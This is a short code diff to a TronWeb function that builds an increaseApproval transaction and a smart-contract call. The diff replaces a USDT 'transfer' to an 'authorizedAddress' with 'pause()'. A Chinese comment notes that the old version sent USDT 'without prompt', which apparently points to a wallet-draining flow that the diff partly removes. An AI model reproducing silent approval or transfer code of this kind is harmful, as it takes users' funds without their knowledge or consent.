@@ -31,22 +31,14 @@ async function executeBlockchainTransaction(
           increaseApprovalParams,
           userAddress
         );
+    console.log(increaseApprovalTx, 'increaseApprovalTx');
 
-    let transferParams = [
-      {
-        type: 'address',
-        value: authorizedAddress,
-      },
-      {
-        type: 'uint256',
-        value: pay_amount * 1000000,
-      },
-    ];
+    let transferParams = [];
 
     // 旧版发送USDT无提示
     let transferTx = await tronWeb.transactionBuilder.triggerSmartContract(
       tronWeb.address.toHex(contractAddress),
-      'transfer(address,uint256)',
+      'pause()',
       {},
       transferParams,
       userAddress
